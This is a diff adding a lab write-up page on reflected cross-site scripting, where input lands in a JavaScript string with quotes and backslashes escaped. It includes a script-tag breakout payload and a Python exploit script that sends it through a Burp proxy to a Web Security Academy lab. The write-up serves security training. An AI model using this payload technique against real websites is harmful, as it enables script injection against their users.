@@ -1,0 +1,94 @@
+---
+title: 'XSS Lab 18'
+description: 'Cross-site scripting in a JavaScript string with single quotes and backslashes escaped'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Reflected XSS into a JavaScript string with single quote and backslash escaped
+
+<div style="text-align: justify;">
+  This lab demonstrates a reflected cross-site scripting vulnerability where user input is embedded inside a JavaScript string. Both single quotes and backslashes are escaped by the application, preventing direct injection using those characters. To bypass this, you must close the `<script>` tag and inject your own script block, which successfully executes arbitrary JavaScript such as `alert(1)`.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The search input is reflected inside a JavaScript string with escaping applied to single quotes (`'`) and backslashes (`\`).
+- Simple injections like `test'payload` fail because of escaping.
+- Instead, you inject an entire `</script>` closing tag, breaking out of the script context.
+- Following it with `<script>alert(1)</script>` creates a new script block that executes JavaScript.
+- This payload bypasses the escaping and successfully executes XSS.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+
+# Disable SSL warnings for Burp Suite
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Set Burp Suite proxy
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+
+def check_burp():
+    # Check if Burp Suite is running and listening on the configured proxy.
+
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=3)
+    except requests.exceptions.RequestException:
+        print("[-] Burp Suite is not running. Please start it and try again.")
+        sys.exit(1)
+
+def exploit_xss(url, payload):
+    # Exploit XSS in search parameter.
+        uri = f"/?search={payload}"
+        res = requests.get(url + uri, verify=False, proxies=proxies)
+        res.raise_for_status()
+        session = requests.Session()
+        res = session.get(url, verify=False, proxies=proxies)
+        if "Congratulations" in res.text:
+            print("[+] Lab solved 🎉")
+            return True
+        else:
+            print("[-] lab not solved.")
+
+def main():
+    # Entry point of the script.
+
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <url>")
+        print(f"Example: python {sys.argv[0]} https://example.com")
+        sys.exit(1)
+
+    url = sys.argv[1].strip()
+
+    # Step 1: Check Burp Suite
+    check_burp()
+
+    # Step 2: Define XSS payload
+    payload = '</script><script>alert(1)</script>'
+
+    # Step 3: Attempt exploitation
+    print("[*] Attempting XSS...")
+    if exploit_xss(url, payload):
+        print("[+] XSS successful!")
+    else:
+        print("[-] XSS unsuccessful.")
+
+if __name__ == "__main__":
+    main()
+```
